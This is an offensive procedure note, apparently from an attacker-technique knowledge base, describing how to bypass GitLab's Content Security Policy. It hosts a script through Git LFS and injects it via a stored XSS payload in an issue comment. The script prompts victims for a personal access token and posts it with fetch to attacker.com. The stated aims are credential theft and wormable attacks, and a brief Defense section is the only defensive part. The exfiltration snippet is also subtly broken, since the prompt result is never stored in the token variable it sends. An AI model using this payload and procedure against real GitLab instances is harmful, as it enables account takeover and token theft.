---
id: f6g7h8i9-j0k1-2345-fghi-678901234567
tags:
  - csp-bypass
  - exfiltration
  - token-theft
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-check-javascript-mime]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Exfiltration Over Command and Control Channel]]'
updated_at: '2025-12-13T23:52:43.809Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exfiltration Over Command and Control Channel]]'
---
# Bypass-CSP-and-Exfiltrate-Access-Token

## Summary

This procedure enhances the XSS payload to bypass GitLab's CSP using self-hosted scripts with proper MIME types, then exfiltrates personal access tokens by prompting creation and remote transmission.

## Description

Modify the payload to load scripts from the same domain (e.g., via Git LFS for application/javascript), evading script-src 'self'. Use dynamic attributes or data-remote for loading. Then, inject JS to prompt token creation with all scopes and send via fetch/XMLHttpRequest to attacker server. Targets GitLab 12.x+; requires repo for hosting JS. Outcome: Full JS control and data theft.

## Requirements

1. GitLab repo for hosting JS files via LFS
2. Remote server for exfiltration
3. Knowledge of CSP headers (script-src 'self')

## Defense

Defensive measures and detection strategies:

- Enforce strict MIME type checking and block LFS abuse for JS
- Monitor for anomalous script loads from raw endpoints
- Implement token creation rate limits and audit logs

## Objectives

1. Circumvent CSP for arbitrary JS execution
2. Steal sensitive credentials like access tokens
3. Enable wormable or persistent attacks

## Instructions

### Step 1: Host Bypass Script

**Context**: Upload JS via Git LFS to get correct MIME, verifiable with curl.

**Command** ([[commands/curl-check-javascript-mime]]):
```bash
curl -I 'https://gitlab.com/vakzz-h1/public/-/raw/master/test.js'
```

> Checks headers; expected: content-type: application/javascript. Upload test.js with LFS: git lfs track '*.js', git add, commit, push.

### Step 2: Inject Advanced Payload

**Context**: Update comment with CSP-bypassing payload.

**Command** (UI Action):
Edit or repost: `[link](...) "title")csp&lt;script src="/vakzz-h1/public/-/raw/master/test.js"></script>`, encoded.

> Expected: On redaction, script loads and executes.

### Step 3: Exfiltrate Token

**Context**: Use payload to prompt and send token.

**Command** (JS in payload):
In test.js: `prompt('Create token and paste'); fetch('https://attacker.com', {method:'POST', body:token});`

> Example in https://gitlab.com/vakzz-h1/stored-xss/-/issues/4; expected: Token sent to remote server.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Exfiltration Over Command and Control Channel]]

### Sub-Techniques


## Commands Used

- [[commands/curl-check-javascript-mime]]

## Tools Used


## Tags

- [[csp-bypass]]
- [[Exfiltration]]
